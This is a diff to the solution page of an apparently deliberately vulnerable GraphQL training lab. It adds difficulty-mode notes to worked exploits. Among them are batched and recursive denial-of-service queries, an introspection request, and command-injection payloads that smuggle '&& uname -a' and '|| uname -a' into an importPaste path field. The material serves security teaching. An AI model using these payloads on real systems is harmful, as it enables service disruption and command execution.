@@ -134,6 +134,8 @@
                   <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-batch')">Show</button></h5>
                   <div id="sol-dos-batch" style="display:none">
                   <pre class="bash">
+# Easy & Expert modes
+
 # We chain multiple resource intensive queries in an array and pass it to GraphQL
 data = [
   {"query":"query {\n  systemUpdate\n}","variables":[]},
@@ -161,6 +163,8 @@ requests.post('http://host/graphql', json=data)</pre>
                   <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-recursion')">Show</button></h5>
                   <div style="display:none" id="sol-dos-recursion">
                   <pre class="bash">
+# Easy & Expert modes
+
 query {
  pastes {
   owner {
@@ -211,6 +215,8 @@ query {
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-intensive')">Show</button></h5>
               <div id="sol-dos-intensive" style="display:none">
               <pre class="bash">
+# Easy & Expert modes
+
 # We measure the amount of time it takes a query to finish
 import time
 
@@ -244,6 +250,29 @@ print('Execution Time :: {} seconds'.format(end - start))
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-introspection')">Show</button></h5>
               <div id="sol-info-introspection" style="display:none">
               <pre class="bash">
+# Easy mode
+# 1. Navigate to http://host/igraphql
+# 2. Run Introspection query:
+
+{
+  "data": {
+    "__schema": {
+      "queryType": {
+        "name": "Query"
+      },
+      "mutationType": {
+        "name": "Mutations"
+      },
+      "subscriptionType": null
+    }
+  }
+}
+
+
+# Expert mode
+# 1. /graphiql is disabled in the user interface, using the command line is required.
+# 2. Introspection will be avaialble via command line.
+
 requests.post('http://host/graphql',
                 json={"query":"query IntrospectionQuery{__schema {queryType { name } mutationType { name } subscriptionType { name }}}"
                 }) # A full introspection query can be found here: https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da
@@ -280,7 +309,10 @@ requests.post('http://host/graphql',
               </ul>
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-igql')">Show</button></h5>
               <div id="sol-info-igql" style="display:none">
-              <pre class="bash">Browse to http://host/graphiql</pre>
+              <pre class="bash">
+# Easy mode:
+Browse to http://host/graphiql
+</pre>
               </div>
               <!-- End -->
 
@@ -362,10 +394,19 @@ mutation {
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-1')">Show</button></h5>
               <div id="sol-exec-os-1" style="display:none">
               <pre class="bash">
-# Import Paste from URL filters a few key separators such as ";" "|", but not "&&"
+# Beginner
+# Import Paste allows specifying UNIX characters to break out of the URL provided to importPaste, using characters such as ";", "&&", "||", and more.
 query {
   importPaste(host:"localhost", port:80, path:"/ && uname -a")
-}</pre>
+}
+
+# Expert
+# Import Paste filters characters such as ";" and "&" but not pipes "|".
+query {
+  importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || uname -a")
+}
+
+</pre>
               </div>
               <!-- End -->
               <br>
